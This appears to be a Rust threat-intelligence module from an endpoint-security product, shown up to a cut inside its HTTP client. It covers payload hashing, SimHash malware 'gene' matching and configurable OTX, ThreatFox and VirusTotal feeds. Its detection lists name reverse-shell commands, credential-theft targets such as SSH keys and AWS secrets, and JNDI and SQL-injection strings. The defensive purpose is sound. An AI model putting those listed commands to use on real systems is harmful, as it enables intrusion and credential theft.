//! 网络攻击指纹调查、代码基因图谱分析与多情报库联动引擎 (`src/threat_intel.rs`)
//!
//! 核心能力：
//! 1. **网络攻击指纹调查 (`NetworkAttackFingerprint`)**：
//!    - 联动 `T5B8 / B8T5` 协议模态编解码、SHA-256 载荷指纹、会话协议族分类（ReverseShell/Shellcode/Redis-RCE/JNDI-SQLi/Base64隧道）、
//!      端口/暴露面与 IPS 历史事件关联特征提取。
//! 2. **代码基因调查 (`CodeGeneProfile`)**：
//!    - 对真实磁盘二进制 (Mach-O/PE/ELF) 或脚本载荷提取标准 SHA-256、64-bit 加权字节 n-gram 局部滚动 SimHash DNA (`gene_simhash_64`)、
//!      分块滚动基因序列 (`rolling_gene_blocks`)、高危 API/恶意指令能力基因 (`extracted_api_genes`) 与恶意代码家族基因相似度匹配。
//! 3. **可配置多情报库接口联动 (`ThreatIntelEngine`)**：
//!    - 开箱预置 5 大默认情报库（本地 `9006 System-1` 三元脑、内置离线 IOC/代码基因库默认启用；AlienVault OTX、abuse.ch ThreatFox、
//!      VirusTotal v3 默认预置就绪）；支持新增自定义 HTTP/HTTPS REST 私有情报接口、在线编辑 URL/API Key/权重、启停切换及持久化。
//!    - 内置轻量双模网络客户端（纯 Rust `TcpStream` HTTP/1.1 + OS 原生 HTTPS `curl` 静默调用），UI 与测试全程零外部新 crate 依赖。

use crate::edr_engine::{LiveProcessRecord, NetworkSocketRecord};
use crate::firewall_ips::IpsEvent;
use crate::platform;
use crate::pretrained_models::inspect_network_payload_t5b8;
use serde::{Deserialize, Serialize};
use std::collections::HashSet;
use std::fs;
use std::io::{Read, Write};
use std::net::{TcpStream, ToSocketAddrs};
use std::path::{Path, PathBuf};
use std::time::{Duration, Instant, SystemTime, UNIX_EPOCH};

/// 情报源类型
#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize, Deserialize)]
pub enum IntelFeedKind {
    /// 本地 9006 System-1 / 三元波记忆与大模型情报库 (http://127.0.0.1:9006/v1/systemone)
    Local9006SystemOneBrain,
    /// 内置离线高精度 IOC + 恶意代码基因图谱库 (builtin://local-ioc-gene-db)
    BuiltinOfflineGeneVault,
    /// AlienVault OTX 开放威胁情报接口
    AlienVaultOtx,
    /// abuse.ch ThreatFox / URLhaus 情报接口
    AbuseChThreatFox,
    /// VirusTotal v3 多引擎声誉接口
    VirusTotalV3,
    /// 用户自定义 STIX / REST HTTP(S) 威胁情报网关
    CustomRestTip,
}

impl IntelFeedKind {
    pub fn label(&self) -> &'static str {
        match self {
            IntelFeedKind::Local9006SystemOneBrain => "本地 9006 认知网关",
            IntelFeedKind::BuiltinOfflineGeneVault => "内置离线 IOC+基因库",
            IntelFeedKind::AlienVaultOtx => "AlienVault OTX",
            IntelFeedKind::AbuseChThreatFox => "abuse.ch ThreatFox",
            IntelFeedKind::VirusTotalV3 => "VirusTotal v3",
            IntelFeedKind::CustomRestTip => "自定义 REST 情报源",
        }
    }
}

/// 单条可配置威胁情报库接口定义
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct ThreatIntelFeedConfig {
    pub feed_id: String,
    pub name: String,
    pub kind: IntelFeedKind,
    pub endpoint_url: String,
    pub auth_header_name: String,
    pub api_key: String,
    pub enabled: bool,
    pub weight: f32,
    pub timeout_ms: u64,
    pub supports_ip: bool,
    pub supports_hash_gene: bool,
    pub description: String,
    pub is_builtin_default: bool,
    pub last_status: String,
    pub total_queries: u64,
    pub total_hits: u64,
}

/// 单次网络攻击指纹提取结果
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct NetworkAttackFingerprint {
    pub fingerprint_id: String,
    pub target_endpoint: String,
    pub remote_ip: String,
    pub port: u16,
    pub protocol_family: String,
    pub t5b8_hex: String,
    pub b8t5_hex: String,
    pub t5_regime: u8,
    pub t5b8_recon_error: f32,
    pub payload_sha256: String,
    pub ja3_behavior_tag: String,
    pub matched_attack_markers: Vec<String>,
    pub network_risk_score: f32,
}

/// 单次目标二进制 / 载荷代码基因图谱分析结果
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct CodeGeneProfile {
    pub gene_id: String,
    pub sample_name: String,
    pub file_path: String,
    pub binary_format: String,
    pub file_size_bytes: u64,
    pub file_sha256: String,
    pub shannon_entropy: f32,
    pub gene_simhash_64: String,
    pub rolling_gene_blocks: Vec<String>,
    pub extracted_api_genes: Vec<String>,
    pub closest_gene_family: String,
    pub gene_similarity_pct: f32,
    pub gene_risk_score: f32,
}

/// 单个情报库的查询命中的关联证据
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct IntelFeedMatch {
    pub feed_id: String,
    pub feed_name: String,
    pub status: String,
    pub matched: bool,
    pub confidence: f32,
    pub threat_tags: Vec<String>,
    pub raw_summary: String,
    pub latency_ms: u64,
}

/// 一次完整的「网络攻击指纹 + 代码基因 + 多情报库联查」调查报告
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct InvestigationReport {
    pub report_id: String,
    pub timestamp: String,
    pub query_input: String,
    pub pid: u32,
    pub process_name: String,
    pub network_fp: NetworkAttackFingerprint,
    pub code_gene: CodeGeneProfile,
    pub feed_matches: Vec<IntelFeedMatch>,
    pub feeds_queried_count: usize,
    pub feeds_hit_count: usize,
    pub fused_threat_score: f32,
    pub verdict_level: String,
    pub recommended_actions: Vec<String>,
    pub linked_mitigation_done: bool,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
struct PersistedThreatIntelConfig {
    feeds: Vec<ThreatIntelFeedConfig>,
    custom_malicious_iocs: Vec<String>,
}

/// 内置已知恶意家族参考基因特征表
struct KnownGeneFamily {
    family_name: &'static str,
    simhash_anchor: u64,
    required_keywords: &'static [&'static str],
    base_risk: f32,
}

const KNOWN_GENE_FAMILIES: &[KnownGeneFamily] = &[
    KnownGeneFamily {
        family_name: "CobaltStrike / Shellcode Memory Loader",
        simhash_anchor: 0xA94C_31F8_8E12_47D5,
        required_keywords: &["VirtualAlloc", "CreateRemoteThread", "NtUnmapViewOfSection", "NOP_SLED", "SYSCALL_STUB"],
        base_risk: 0.92,
    },
    KnownGeneFamily {
        family_name: "POSIX / PowerShell ReverseShell Dropper",
        simhash_anchor: 0x5D18_9A42_C077_13E9,
        required_keywords: &["/dev/tcp/", "bash -i", "pty.spawn", "powershell -enc", "Invoke-Expression", "nc -e"],
        base_risk: 0.90,
    },
    KnownGeneFamily {
        family_name: "Mimikatz / Credential & Vault Harvester",
        simhash_anchor: 0xE21B_604D_98A1_55C3,
        required_keywords: &["mimikatz", "sekurlsa", "lsass", "dump-keychain", ".ssh/id_rsa", "AWS_SECRET"],
        base_risk: 0.88,
    },
    KnownGeneFamily {
        family_name: "FRP / Chisel / Cryptominer C2 Tunnel",
        simhash_anchor: 0x74F1_28C9_3B60_9214,
        required_keywords: &["stratum+tcp", "xmrig", "frpc", "chisel", "socks5", "CONFIG SET dir"],
        base_risk: 0.84,
    },
    KnownGeneFamily {
        family_name: "DYLD / LD_PRELOAD Injector & Adware Module",
        simhash_anchor: 0x39E0_81B4_7A22_6601,
        required_keywords: &["DYLD_INSERT_LIBRARIES", "LD_PRELOAD", "mach_vm_write", "WScript.Shell", "MacKeeper"],
        base_risk: 0.78,
    },
];

/// 标准 FIPS 180-4 纯 Rust SHA-256（无第三方 crate 依赖）
pub fn compute_sha256_hex(data: &[u8]) -> String {
    const K: [u32; 64] = [
        0x428a2f98, 0x71374491, 0xb5c0fbcf, 0xe9b5dba5, 0x3956c25b, 0x59f111f1, 0x923f82a4, 0xab1c5ed5,
        0xd807aa98, 0x12835b01, 0x243185be, 0x550c7dc3, 0x72be5d74, 0x80deb1fe, 0x9bdc06a7, 0xc19bf174,
        0xe49b69c1, 0xefbe4786, 0x0fc19dc6, 0x240ca1cc, 0x2de92c6f, 0x4a7484aa, 0x5cb0a9dc, 0x76f988da,
        0x983e5152, 0xa831c66d, 0xb00327c8, 0xbf597fc7, 0xc6e00bf3, 0xd5a79147, 0x06ca6351, 0x14292967,
        0x27b70a85, 0x2e1b2138, 0x4d2c6dfc, 0x53380d13, 0x650a7354, 0x766a0abb, 0x81c2c92e, 0x92722c85,
        0xa2bfe8a1, 0xa81a664b, 0xc24b8b70, 0xc76c51a3, 0xd192e819, 0xd6990624, 0xf40e3585, 0x106aa070,
        0x19a4c116, 0x1e376c08, 0x2748774c, 0x34b0bcb5, 0x391c0cb3, 0x4ed8aa4a, 0x5b9cca4f, 0x682e6ff3,
        0x748f82ee, 0x78a5636f, 0x84c87814, 0x8cc70208, 0x90befffa, 0xa4506ceb, 0xbef9a3f7, 0xc67178f2,
    ];
    let mut h: [u32; 8] = [
        0x6a09e667, 0xbb67ae85, 0x3c6ef372, 0xa54ff53a,
        0x510e527f, 0x9b05688c, 0x1f83d9ab, 0x5be0cd19,
    ];
    let bit_len = (data.len() as u64).wrapping_mul(8);
    let mut padded = data.to_vec();
    padded.push(0x80);
    while (padded.len() % 64) != 56 {
        padded.push(0);
    }
    padded.extend_from_slice(&bit_len.to_be_bytes());

    for chunk in padded.chunks_exact(64) {
        let mut w = [0u32; 64];
        for i in 0..16 {
            w[i] = u32::from_be_bytes([
                chunk[i * 4],
                chunk[i * 4 + 1],
                chunk[i * 4 + 2],
                chunk[i * 4 + 3],
            ]);
        }
        for i in 16..64 {
            let s0 = w[i - 15].rotate_right(7) ^ w[i - 15].rotate_right(18) ^ (w[i - 15] >> 3);
            let s1 = w[i - 2].rotate_right(17) ^ w[i - 2].rotate_right(19) ^ (w[i - 2] >> 10);
            w[i] = w[i - 16]
                .wrapping_add(s0)
                .wrapping_add(w[i - 7])
                .wrapping_add(s1);
        }
        let [mut a, mut b, mut c, mut d, mut e, mut f, mut g, mut hh] = h;
        for i in 0..64 {
            let s1 = e.rotate_right(6) ^ e.rotate_right(11) ^ e.rotate_right(25);
            let ch = (e & f) ^ ((!e) & g);
            let temp1 = hh
                .wrapping_add(s1)
                .wrapping_add(ch)
                .wrapping_add(K[i])
                .wrapping_add(w[i]);
            let s0 = a.rotate_right(2) ^ a.rotate_right(13) ^ a.rotate_right(22);
            let maj = (a & b) ^ (a & c) ^ (b & c);
            let temp2 = s0.wrapping_add(maj);

            hh = g;
            g = f;
            f = e;
            e = d.wrapping_add(temp1);
            d = c;
            c = b;
            b = a;
            a = temp1.wrapping_add(temp2);
        }
        let vals = [a, b, c, d, e, f, g, hh];
        for (idx, val) in vals.into_iter().enumerate() {
            h[idx] = h[idx].wrapping_add(val);
        }
    }

    let mut hex = String::with_capacity(64);
    for word in h {
        hex.push_str(&format!("{:08x}", word));
    }
    hex
}

fn fnv1a_64(bytes: &[u8]) -> u64 {
    let mut h: u64 = 0xcbf29ce484222325;
    for &b in bytes {
        h ^= b as u64;
        h = h.wrapping_mul(0x100000001b3);
    }
    h
}

fn compute_shannon_entropy(bytes: &[u8]) -> f32 {
    if bytes.is_empty() {
        return 0.0;
    }
    let mut counts = [0u32; 256];
    for &b in bytes {
        counts[b as usize] += 1;
    }
    let len = bytes.len() as f32;
    let mut ent = 0.0f32;
    for c in counts {
        if c > 0 {
            let p = (c as f32) / len;
            ent -= p * p.log2();
        }
    }
    ent
}

fn compute_code_gene_simhash(bytes: &[u8], api_genes: &[String]) -> u64 {
    let mut accum = [0i32; 64];
    // 1. 4-byte 滑动窗口结构基因权重（步长自适应保证大样本 O(1) 有界开销）
    let step = (bytes.len() / 8192).max(1);
    let mut i = 0usize;
    while i + 4 <= bytes.len() {
        let h = fnv1a_64(&bytes[i..i + 4]);
        for bit in 0..64 {
            if (h >> bit) & 1 == 1 {
                accum[bit] += 1;
            } else {
                accum[bit] -= 1;
            }
        }
        i += step;
    }
    // 2. 高危能力/API 基因强权重注入（保证家族变种跨混淆仍保持高基因相关性）
    for gene in api_genes {
        let h = fnv1a_64(gene.as_bytes());
        for bit in 0..64 {
            if (h >> bit) & 1 == 1 {
                accum[bit] += 64;
            } else {
                accum[bit] -= 64;
            }
        }
    }
    let mut out = 0u64;
    for (bit, &v) in accum.iter().enumerate() {
        if v >= 0 {
            out |= 1u64 << bit;
        }
    }
    out
}

fn compute_rolling_gene_blocks(bytes: &[u8]) -> Vec<String> {
    if bytes.is_empty() {
        return Vec::new();
    }
    let chunks = 8usize.min(bytes.len().max(1));
    let chunk_size = (bytes.len() / chunks).max(1);
    bytes
        .chunks(chunk_size)
        .take(8)
        .enumerate()
        .map(|(idx, c)| format!("G{}:{:08x}", idx + 1, (fnv1a_64(c) >> 32) as u32))
        .collect()
}

fn now_hms() -> String {
    if let Ok(dur) = SystemTime::now().duration_since(UNIX_EPOCH) {
        let secs = dur.as_secs() + 8 * 3600;
        format!("{:02}:{:02}:{:02}", (secs / 3600) % 24, (secs / 60) % 60, secs % 60)
    } else {
        "12:00:00".to_string()
    }
}

fn looks_like_ipv4_or_v6(s: &str) -> bool {
    let t = s.trim().trim_start_matches('[').trim_end_matches(']');
    t.parse::<std::net::IpAddr>().is_ok()
}

fn looks_like_sha256(s: &str) -> bool {
    let t = s.trim();
    t.len() == 64 && t.chars().all(|c| c.is_ascii_hexdigit())
}

fn split_ip_port(raw: &str) -> (String, u16) {
    let clean = raw.trim();
    if looks_like_ipv4_or_v6(clean) {
        return (clean.trim_start_matches('[').trim_end_matches(']').to_string(), 0);
    }
    if let Some((h, p)) = clean.rsplit_once(':') {
        if let Ok(port) = p.parse::<u16>() {
            let host = h.trim_start_matches('[').trim_end_matches(']').to_string();
            return (host, port);
        }
    }
    (clean.to_string(), 0)
}

/// 构造开箱即用的默认多情报库列表（本地 9006 + 内置离线库默认开启；OTX/ThreatFox/VirusTotal 默认预置就绪）
pub fn build_default_intel_feeds() -> Vec<ThreatIntelFeedConfig> {
    vec![
        ThreatIntelFeedConfig {
            feed_id: "FEED-LOCAL-9006".to_string(),
            name: "VNB 本地 9006 System-1 认知情报脑".to_string(),
            kind: IntelFeedKind::Local9006SystemOneBrain,
            endpoint_url: "http://127.0.0.1:9006/v1/systemone".to_string(),
            auth_header_name: "X-VNB-Client".to_string(),
            api_key: "local-9006-internal".to_string(),
            enabled: true,
            weight: 1.0,
            timeout_ms: 250,
            supports_ip: true,
            supports_hash_gene: true,
            description: "本地 9006 三元记忆库 + SimHash64 零延迟认知协同情报引擎（默认启用）".to_string(),
            is_builtin_default: true,
            last_status: "默认启用 · 毫秒级本地直连".to_string(),
            total_queries: 0,
            total_hits: 0,
        },
        ThreatIntelFeedConfig {
            feed_id: "FEED-OFFLINE-VAULT".to_string(),
            name: "VNB 内置高危 IOC 与恶意代码基因库".to_string(),
            kind: IntelFeedKind::BuiltinOfflineGeneVault,
            endpoint_url: "builtin://local-ioc-gene-db".to_string(),
            auth_header_name: String::new(),
            api_key: String::new(),
            enabled: true,
            weight: 0.95,
            timeout_ms: 10,
            supports_ip: true,
            supports_hash_gene: true,
            description: "内置 APT/C2 测试网段、高危端口、EICAR/常见木马 Hash 与 5 大代码基因家族库（默认启用，断网可用）".to_string(),
            is_builtin_default: true,
            last_status: "默认启用 · 离线库就绪".to_string(),
            total_queries: 0,
            total_hits: 0,
        },
        ThreatIntelFeedConfig {
            feed_id: "FEED-OTX-PUBLIC".to_string(),
            name: "AlienVault OTX 全球威胁情报接口".to_string(),
            kind: IntelFeedKind::AlienVaultOtx,
            endpoint_url: "https://otx.alienvault.com/api/v1/indicators".to_string(),
            auth_header_name: "X-OTX-API-KEY".to_string(),
            api_key: String::new(),
            enabled: false,
            weight: 0.85,
            timeout_ms: 2600,
            supports_ip: true,
            supports_hash_gene: true,
            description: "默认预置 OTX Open Threat Exchange API；填入 X-OTX-API-KEY 并启用即可在线联查 IP/Hash 脉冲".to_string(),
            is_builtin_default: true,
            last_status: "预置待启用（可填写 API Key 后启用）".to_string(),
            total_queries: 0,
            total_hits: 0,
        },
        ThreatIntelFeedConfig {
            feed_id: "FEED-ABUSECH-TF".to_string(),
            name: "abuse.ch ThreatFox 恶意 IOC 情报接口".to_string(),
            kind: IntelFeedKind::AbuseChThreatFox,
            endpoint_url: "https://threatfox-api.abuse.ch/api/v1/".to_string(),
            auth_header_name: "Auth-Key".to_string(),
            api_key: String::new(),
            enabled: false,
            weight: 0.90,
            timeout_ms: 2600,
            supports_ip: true,
            supports_hash_gene: true,
            description: "默认预置 abuse.ch ThreatFox C2/Payload/Botnet IOC 接口，支持 Auth-Key 在线联动".to_string(),
            is_builtin_default: true,
            last_status: "预置待启用（支持 ThreatFox IOC 查询）".to_string(),
            total_queries: 0,
            total_hits: 0,
        },
        ThreatIntelFeedConfig {
            feed_id: "FEED-VIRUSTOTAL-V3".to_string(),
            name: "VirusTotal v3 多引擎样本基因声誉接口".to_string(),
            kind: IntelFeedKind::VirusTotalV3,
            endpoint_url: "https://www.virustotal.com/api/v3".to_string(),
            auth_header_name: "x-apikey".to_string(),
            api_key: String::new(),
            enabled: false,
            weight: 0.98,
            timeout_ms: 2800,
            supports_ip: true,
            supports_hash_gene: true,
            description: "默认预置 VirusTotal API v3（支持 File SHA-256 与 IP 声誉联查），配置 x-apikey 后启用".to_string(),
            is_builtin_default: true,
            last_status: "预置待启用（需配置 VT x-apikey）".to_string(),
            total_queries: 0,
            total_hits: 0,
        },
    ]
}

/// 从网络端点 / IPS 事件 / 报文样本提取多维网络攻击指纹
pub fn extract_network_attack_fingerprint(
    target_endpoint: &str,
    remote_ip: &str,
    port: u16,
    proc_name: &str,
    payload_opt: Option<&[u8]>,
    socket_opt: Option<&NetworkSocketRecord>,
    ips_events: &[IpsEvent],
) -> NetworkAttackFingerprint {
    let default_probe = format!("CONN {} -> {}:{} ({})", proc_name, remote_ip, port, target_endpoint);
    let payload_bytes = payload_opt.unwrap_or(default_probe.as_bytes());
    let local_p = socket_opt.map(|s| s.local_port).unwrap_or(0);
    let remote_p = if port > 0 {
        port
    } else {
        socket_opt.map(|s| s.remote_port).unwrap_or(0)
    };
    let is_wild = socket_opt.map(|s| s.is_wildcard_exposed).unwrap_or(false);

    let t5b8 = inspect_network_payload_t5b8(payload_bytes, proc_name, local_p, remote_p, is_wild);
    let payload_sha256 = compute_sha256_hex(payload_bytes);
    let text_lower = String::from_utf8_lossy(payload_bytes).to_ascii_lowercase();

    let mut markers = Vec::new();
    let mut risk = 0.0f32;
    let mut family = "Standard-Session/Traffic".to_string();

    if text_lower.contains("/dev/tcp/")
        || text_lower.contains("bash -i")
        || text_lower.contains("nc -e")
        || text_lower.contains("powershell -enc")
    {
        family = "ReverseShell-C2-TCP".to_string();
        markers.push("反弹 Shell 命令特征 (/dev/tcp / bash -i / nc -e)".to_string());
        risk = risk.max(0.95);
    }
    if payload_bytes.windows(5).any(|w| w == [0x90, 0x90, 0x90, 0x90, 0x90])
        || payload_bytes.windows(2).any(|w| w == [0x0f, 0x05] || w == [0xcd, 0x80])
    {
        family = "Binary-Shellcode-NOP-Sled".to_string();
        markers.push("二进制 NOP Sled + Syscall 注入机器码指纹".to_string());
        risk = risk.max(0.94);
    }
    if (text_lower.contains("config") && text_lower.contains("set"))
        || text_lower.contains("${jndi:")
        || text_lower.contains("union select ")
    {
        family = "Exploit-RCE/JNDI/SQLi".to_string();
        markers.push("RCE/JNDI/SQL 注入攻击语法指纹".to_string());
        risk = risk.max(0.91);
    }
    if matches!(remote_p, 4444 | 1337 | 31337 | 6667) || matches!(local_p, 6379 | 445 | 3389 | 23) {
        markers.push(format!("高危/C2 敏感端口指纹 Port={}", if remote_p > 0 { remote_p } else { local_p }));
        risk = risk.max(0.75);
    }
    if t5b8.is_attack {
        if family == "Standard-Session/Traffic" {
            family = t5b8.attack_class.clone();
        }
        markers.push(format!(
            "T5B8 协议异常态 (Word={}, T5={}, Δ={:.2})",
            t5b8.t5b8_hex, t5b8.t5_regime, t5b8.recon_error
        ));
        risk = risk.max((t5b8.recon_error * 1.45).clamp(0.60, 0.93));
    }
    if let Some(sock) = socket_opt {
        if sock.is_c2_suspicious {
            markers.push(format!("活跃 Socket 告警: {}", sock.c2_reason));
            risk = risk.max(0.82);
        } else if sock.is_wildcard_exposed {
            markers.push(format!("全网段监听暴露: {}", sock.local_endpoint));
            risk = risk.max(0.65);
        }
    }
    for ev in ips_events.iter().take(64) {
        if (!remote_ip.is_empty() && ev.remote_ip == remote_ip) || (!proc_name.is_empty() && ev.process_name == proc_name) {
            markers.push(format!("关联 IPS 事件 {} ({})", ev.signature_id, ev.signature_name));
            risk = risk.max(0.88);
            break;
        }
    }
    if markers.is_empty() {
        markers.push("未检出显式攻击指纹，协议分布处于常规态".to_string());
    }

    let fp_hash = fnv1a_64(format!("{}|{}|{}|{}", remote_ip, remote_p, t5b8.t5b8_hex, payload_sha256).as_bytes());
    let ja3_behavior_tag = format!(
        "T5B8:{} | Reg:{} | Port:{} | SHA256:{}",
        t5b8.t5b8_hex,
        t5b8.t5_regime,
        if remote_p > 0 { remote_p } else { local_p },
        &payload_sha256[..12]
    );

    NetworkAttackFingerprint {
        fingerprint_id: format!("NETFP-{:08X}", (fp_hash >> 32) as u32),
        target_endpoint: target_endpoint.to_string(),
        remote_ip: remote_ip.to_string(),
        port: if remote_p > 0 { remote_p } else { local_p },
        protocol_family: family,
        t5b8_hex: t5b8.t5b8_hex,
        b8t5_hex: format!("0x{:04X}", t5b8.b8t5_word),
        t5_regime: t5b8.t5_regime,
        t5b8_recon_error: t5b8.recon_error,
        payload_sha256,
        ja3_behavior_tag,
        matched_attack_markers: markers,
        network_risk_score: risk.clamp(0.0, 1.0),
    }
}

/// 从磁盘可执行体/脚本或内存载荷提取真实代码基因图谱 (SHA-256 + SimHash64 DNA + 高危 API 基因 + 家族聚类匹配)
pub fn extract_code_gene_profile(
    file_path: &str,
    inline_bytes_opt: Option<&[u8]>,
    proc_name: &str,
    direct_sha256_query: Option<&str>,
) -> CodeGeneProfile {
    let mut bytes_buf: Vec<u8> = Vec::new();
    let mut real_file_size = 0u64;
    let mut format_str = "Memory/Hash Abstract".to_string();

    if !file_path.is_empty() && Path::new(file_path).is_file() {
        if let Ok(meta) = fs::metadata(file_path) {
            real_file_size = meta.len();
        }
        if let Ok(mut f) = fs::File::open(file_path) {
            let cap = 512 * 1024usize;
            let mut tmp = vec![0u8; cap];
            if let Ok(n) = f.read(&mut tmp) {
                tmp.truncate(n);
                bytes_buf = tmp;
            }
        }
        let (arch, signer) = platform::inspect_binary_format_and_pe_signer(file_path);
        format_str = match signer {
            Some(s) => format!("{} ({})", arch, s),
            None => arch,
        };
    } else if let Some(b) = inline_bytes_opt {
        bytes_buf = b.to_vec();
        real_file_size = b.len() as u64;
        format_str = "In-Memory Payload / Script Buffer".to_string();
    }

    let file_sha256 = if let Some(h) = direct_sha256_query {
        h.to_ascii_lowercase()
    } else if !bytes_buf.is_empty() {
        compute_sha256_hex(&bytes_buf)
    } else {
        compute_sha256_hex(format!("META|{}|{}", proc_name, file_path).as_bytes())
    };

    let entropy = compute_shannon_entropy(&bytes_buf);
    let text_lossy = String::from_utf8_lossy(&bytes_buf);
    let text_lower = text_lossy.to_ascii_lowercase();

    let mut api_genes: Vec<String> = Vec::new();
    let gene_patterns: &[(&str, &str)] = &[
        ("virtualalloc", "[INJECT] VirtualAlloc"),
        ("createremotethread", "[INJECT] CreateRemoteThread"),
        ("writeprocessmemory", "[INJECT] WriteProcessMemory"),
        ("ntunmapviewofsection", "[INJECT] NtUnmapViewOfSection"),
        ("dyld_insert_libraries", "[INJECT] DYLD_INSERT_LIBRARIES"),
        ("mach_vm_write", "[INJECT] mach_vm_write"),
        ("ld_preload", "[INJECT] LD_PRELOAD"),
        ("ptrace", "[INJECT] ptrace"),
        ("/dev/tcp/", "[SHELL] /dev/tcp/"),
        ("bash -i", "[SHELL] bash -i"),
        ("pty.spawn", "[SHELL] pty.spawn"),
        ("nc -e", "[SHELL] nc -e"),
        ("powershell -enc", "[EXEC] powershell -enc"),
        ("invoke-expression", "[EXEC] Invoke-Expression"),
        ("wscript.shell", "[EXEC] WScript.Shell"),
        ("mimikatz", "[CRED] mimikatz"),
        ("sekurlsa", "[CRED] sekurlsa"),
        ("lsass", "[CRED] lsass"),
        ("dump-keychain", "[CRED] dump-keychain"),
        (".ssh/id_rsa", "[CRED] .ssh/id_rsa"),
        ("aws_secret", "[CRED] AWS_SECRET"),
        ("stratum+tcp", "[C2] stratum+tcp"),
        ("xmrig", "[C2] xmrig"),
        ("frpc", "[C2] frpc"),
        ("chisel", "[C2] chisel"),
        ("socks5", "[C2] socks5"),
        ("config set dir", "[RCE] CONFIG SET dir"),
        ("${jndi:", "[RCE] ${jndi:"),
        ("union select ", "[SQLI] union select "),
        ("upx!", "[PACKER] UPX!"),
        ("mackeeper", "[ADWARE] MacKeeper"),
    ];

    for &(needle, label) in gene_patterns {
        if text_lower.contains(needle) {
            api_genes.push(label.to_string());
        }
    }
    if bytes_buf.windows(5).any(|w| w == [0x90, 0x90, 0x90, 0x90, 0x90]) {
        api_genes.push("[OPCODE] NOP_SLED".to_string());
    }
    if bytes_buf.windows(2).any(|w| w == [0x0f, 0x05] || w == [0xcd, 0x80]) {
        api_genes.push("[OPCODE] SYSCALL_STUB".to_string());
    }
    if entropy >= 7.25 && real_file_size >= 4096 {
        api_genes.push(format!("[ENTROPY] 高熵加壳特征 H={:.2}", entropy));
    }

    let simhash = compute_code_gene_simhash(&bytes_buf, &api_genes);
    let rolling_blocks = compute_rolling_gene_blocks(&bytes_buf);

    // 对比内置恶意家族代码基因原型，计算家族归因与综合基因相似度
    let mut best_family = "Benign / Clean System or Standard Dev Binary".to_string();
    let mut best_sim_pct = 12.0f32;
    let mut best_risk = 0.05f32;

    for fam in KNOWN_GENE_FAMILIES {
        let mut kw_hits = 0usize;
        for kw in fam.required_keywords {
            let kw_l = kw.to_ascii_lowercase();
            if api_genes.iter().any(|g| g.to_ascii_lowercase().contains(&kw_l)) {
                kw_hits += 1;
            }
        }
        let hamming_dist = (simhash ^ fam.simhash_anchor).count_ones();
        let bit_sim = 1.0 - (hamming_dist as f32) / 64.0;
        let kw_ratio = (kw_hits as f32) / (fam.required_keywords.len().max(1) as f32);
        let combined_sim = if kw_hits > 0 {
            (bit_sim * 28.0 + kw_ratio * 72.0).clamp(35.0, 99.0)
        } else {
            (bit_sim * 32.0).clamp(5.0, 42.0)
        };
        if kw_hits > 0 && combined_sim > best_sim_pct {
            best_sim_pct = combined_sim;
            best_family = fam.family_name.to_string();
            best_risk = (fam.base_risk * (0.65 + 0.35 * kw_ratio)).clamp(0.45, 0.98);
        }
    }

    if api_genes.is_empty() && bytes_buf.is_empty() && direct_sha256_query.is_none() {
        api_genes.push("纯网络 IOC 调查（无本地文件字节样本）".to_string());
        best_sim_pct = 0.0;
        best_risk = 0.0;
    } else if api_genes.is_empty() {
        api_genes.push("未检出高危注入/Shell/窃密 API 基因特征".to_string());
    }

    let sample_name = if !proc_name.is_empty() {
        proc_name.to_string()
    } else if !file_path.is_empty() {
        Path::new(file_path)
            .file_name()
            .and_then(|n| n.to_str())
            .unwrap_or(file_path)
            .to_string()
    } else {
        "Sample-Buffer".to_string()
    };

    CodeGeneProfile {
        gene_id: format!("DNA-{:08X}", (simhash >> 32) as u32),
        sample_name,
        file_path: file_path.to_string(),
        binary_format: format_str,
        file_size_bytes: real_file_size,
        file_sha256,
        shannon_entropy: entropy,
        gene_simhash_64: format!("0x{:016X}", simhash),
        rolling_gene_blocks: rolling_blocks,
        extracted_api_genes: api_genes,
        closest_gene_family: best_family,
        gene_similarity_pct: (best_sim_pct * 10.0).round() / 10.0,
        gene_risk_score: best_risk.clamp(0.0, 1.0),
    }
}

/// 纯 Rust TCP HTTP/1.1 请求客户端（支持 localhost / 内网 HTTP TIP 与单元测试本地 Mock 情报网关）
fn execute_plain_http_request(
    method: &str,
    url: &str,
    headers: &[(&str, &str)],
    body_opt: Option<&str>,
    timeout_ms: u64,
) -> Result<(u16, String), String> {
    let rest = url
        .strip_prefix("http://")
        .ok_or_else(|| "非 http:// URL".to_string())?;
    let (host_port, raw_path) = match rest.find('/') {
        Some(pos) => (&rest[..pos], &rest[pos..]),
        None => (rest, "/"),
    };
    let host_only = host_port.split(':').next().unwrap_or(host_port);
    let addr_str = if host_port.contains(':') {
        host_port.to_string()
    } else {
        format!("{}:80", host_port)
    };
    let sock_addr = addr_str
        .to_socket_addrs()
        .map_err(|e| format!("DNS/地址解析失败 ({}): {}", addr_str, e))?
        .next()
        .ok_or_else(|| format!("未解析到可用套接字地址: {}", addr_str))?;

    let dur = Duration::from_millis(timeout_ms.clamp(50, 5000));
    let mut stream = TcpStream::connect_timeout(&sock_addr, dur)
        .map_err(|e| format!("TCP 连接 {} 失败: {}", addr_str, e))?;
    let _ = stream.set_read_timeout(Some(dur));
    let _ = stream.set_write_timeout(Some(dur));

    let body_bytes = body_opt.map(|b| b.as_bytes()).unwrap_or(&[]);
    let mut req = format!(
        "{} {} HTTP/1.1\r\nHost: {}\r\nUser-Agent: VNB-ThreatIntel/2.2\r\nAccept: application/json\r\nConnection: close\r\n",
        method, raw_path, host_only
    );
    for (k, v) in headers {
        if !k.trim().is_empty() && !v.trim().is_empty() && !k.contains('\r') && !v.contains('\n') {
            req.push_str(&format!("{}: {}\r\n", k.trim(), v.trim()));
        }
    }
    if !body_bytes.is_empty() {
        req.push_str(&format!(
            "Content-Type: application/json\r\nContent-Length: {}\r\n",
            body_bytes.len()
        ));
    }
    req.push_str("\r\n");

    stream
        .write_all(req.as_bytes())
        .map_err(|e| format!("发送 HTTP 请求头失败: {}", e))?;
    if !body_bytes.is_empty() {
        stream
            .write_all(body_bytes)
            .map_err(|e| format!("发送 HTTP 请求体失败: {}", e))?;
    }

    let mut raw_resp = Vec::with_capacity(4096);
    let mut chunk = [0u8; 4096];
    let mut expected_total: Option<usize> = None;
    while raw_resp.len() < 262_144 {
        match stream.read(&mut chunk) {
